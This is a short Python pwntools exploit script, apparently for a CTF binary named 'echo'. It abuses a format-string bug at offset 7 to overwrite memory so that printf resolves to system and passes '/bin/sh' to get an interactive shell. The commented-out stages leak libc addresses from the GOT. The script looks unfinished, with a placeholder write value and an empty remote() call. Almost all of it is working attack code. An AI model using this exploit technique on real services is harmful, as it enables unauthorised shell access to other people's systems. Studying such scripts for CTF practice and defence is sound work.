#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-08 21:08:57
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./echo"
rop = roputils.ROP(target)
bss = rop.section('.bss')+0x30
printf_got = rop.got('printf')
dyn_str = 0x08049f58

if DEBUG:
	p = process(target)
	gdb.attach(p,"b*0x80486C1\nc")
else:
	p = remote()

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

# stage 1 get fmt offset
# def exec_fmt(payload):
# 	p = process(target)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	return p.recvuntil(",")[:-1]

# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset

def send_payload(payload):
	ru("input:")
	sl(payload)
	ru("input:")
	sl("/bin/sh\x00")
offset = 7
# stage 2 get system_addr


# p = process(target)
# printf_got = rop.got("printf")
# puts_got = rop.got("puts")

# ru("input:")
# sl(p32(printf_got)+"%7$s")
# ru("input:")
# sl("payload")

# printf_addr = u32(p.recv(8)[4:])

# ru("input:")
# sl(p32(puts_got)+"%7$s")
# ru("input:")
# sl("payload")

# puts_addr = u32(p.recv(8)[4:])

# print "printf_addr="+hex(printf_addr)
# print "puts_addr="+hex(puts_addr)


# system_addr = printf_addr+o

# stage 3 change printf_addr to system_addr
autofmt = FmtStr(send_payload,offset=offset)
autofmt.write(dyn_str,0xdeadbeaf)
autofmt.execute_writes()
# print offset
# print "bss_addr="+hex(bss)
# payload = fmtstr_payload(1,{bss:0xdeadbeaf},1,"byte")
# print payload

p.interactive()